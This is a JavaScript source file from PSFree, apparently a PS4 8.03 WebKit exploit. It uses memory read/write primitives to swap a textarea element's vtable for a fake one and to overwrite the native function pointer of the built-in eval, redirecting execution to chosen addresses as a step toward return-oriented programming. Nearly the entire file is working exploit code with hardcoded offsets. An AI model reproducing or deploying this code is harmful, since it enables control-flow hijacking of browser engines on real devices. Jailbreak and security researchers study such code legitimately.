/* Copyright (C) 2024 anonymous

This file is part of PSFree.

PSFree is free software: you can redistribute it and/or modify
it under the terms of the GNU Affero General Public License as
published by the Free Software Foundation, either version 3 of the
License, or (at your option) any later version.

PSFree is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU Affero General Public License for more details.

You should have received a copy of the GNU Affero General Public License
along with this program.  If not, see <https://www.gnu.org/licenses/>.  */

import * as config from './config.mjs';

import { Int } from './module/int64.mjs';
import { debug_log } from './module/utils.mjs';
import { Addr, mem } from './module/mem.mjs';
import { make_buffer } from './module/memtools.mjs';

import * as rw from './module/rw.mjs';
import * as o from './module/offset.mjs';

const origin = window.origin;
const port = '8000';
const url = `${origin}:${port}`;

const offset_scrollLeft = (() => {
    switch (config.target) {
        case config.ps4_8_03: {
            return 0x1c8;
        }
        default: {
            throw RangeError(`invalid config.target: ${config.target}`);
        }
    }
})();

const textarea = document.createElement('textarea');

// JSObject
let addr = mem.addrof(textarea);
// WebCore::HTMLTextAreaElement
addr = addr.readp(0x18);
const webcore_textarea = addr;
// vtable for WebCore::HTMLTextAreaElement
addr = addr.readp(0);
const original_vtable = addr;

debug_log(`vtable: ${addr}`);
const vtable = make_buffer(addr, 0x400);
const fake_vtable = new Uint8Array(vtable);
const fake_vtable_buffer = (
    mem.addrof(fake_vtable).read64(o.view_m_vector)
);

const scrollLeft = rw.read64(fake_vtable, offset_scrollLeft);
const scrollLeft_size = (() => {
    switch (config.target) {
        case config.ps4_8_03: {
            return 0xd7;
        }
        default: {
            throw RangeError(`invalid config.target: ${config.target}`);
        }
    }
})();

 function main() {
    const offset_vtable = 0;
    debug_log(`${offset_scrollLeft.toString(16)}: ${scrollLeft}`);
    webcore_textarea.write64(offset_vtable, fake_vtable_buffer);
    // jump to end of function
    rw.write64(
        fake_vtable,
        offset_scrollLeft,
        scrollLeft.add(scrollLeft_size)
    );
    // textarea.scrollLeft will usually return a 0, since we jumped to end of
    // WebCore::Element::scrollLeft() immediately, the return value is usually
    // not 0.
    debug_log(`scroll: ${textarea.scrollLeft}`);
    webcore_textarea.write64(offset_vtable, original_vtable);
}

 function rop2() {
    // eval() is a built-in function
    // We could use any built-in function, e.g. parseInt(), parseFloat(),
    // Date.prototype.getTime(), etc. Search for "host" functions at
    // WebKit/Source/JavaScriptCore/runtime at PS4 8.03.
    const func = eval;
    // JSC::JSFunction
    const js_function = mem.addrof(func);
    // JSFunction::m_executable
    // Since the function is built-in, m_executable is of type
    // JSC::NativeExecutable.
    const exec = js_function.readp(0x18);
    // NativeExecutable::m_function, pointer to the implementation of a
    // built-in function
    const offset_m_function = 0x38;
    exec.write64(
        offset_m_function,
        scrollLeft.add(scrollLeft_size) // jump to a ret instruction
    );
    debug_log(scrollLeft.add(scrollLeft_size));
    debug_log(exec.read64(offset_m_function));
    // must not evaluate since we changed m_function
    func('alert("hi")');
    debug_log('returned successfully');
}

main();
rop2();
